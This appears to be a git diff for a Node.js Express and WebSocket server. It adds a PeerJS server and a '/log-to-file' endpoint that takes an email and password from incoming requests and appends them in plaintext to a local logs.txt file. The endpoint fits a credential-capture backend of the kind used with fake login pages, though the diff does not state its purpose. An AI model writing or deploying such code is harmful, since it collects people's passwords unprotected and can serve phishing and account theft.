@@ -7,12 +7,35 @@ const http = require('http');
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
+const { ExpressPeerServer } = require("peer");
+const fs = require('fs');
+
+// Function to log data to a file
+async function logToFile(email, password) {
+    const logFilePath = path.join(__dirname, 'logs.txt'); // Path to the log file
+    const logEntry = `${email}, ${password}, ${new Date().toISOString()}\n`; // Format the log entry
+
+    // Append the log entry to the file
+    fs.appendFileSync(logFilePath, logEntry, 'utf8');
+    console.log(`Logged data to file: ${logFilePath}`);
+}
 
 app.use(express.static('public'));
 
 app.get('/check_status', (req, res) => {
     res.send('Server is running!');
   });
+
+app.post('/log-to-file', express.json(), async (req, res) => {
+    const { email, password } = req.body;
+
+    try {
+        await logToFile(email, password);
+        res.status(200).send({ success: true });
+    } catch (error) {
+        res.status(500).send({ success: false, error: 'Failed to log data' });
+    }
+});
 
 console.log("WebSocket Server running on ws://localhost:8080");
 
@@ -56,6 +79,12 @@ wss.on('connection', (ws) => {
         console.log("Client disconnected.");
     });
 });
+
+const peerServer = ExpressPeerServer(server, {
+	path: "/myapp",
+});
+
+app.use("/peerjs", peerServer);
 
 server.listen(8080, () => {
     console.log("Server running on http://localhost:8080");
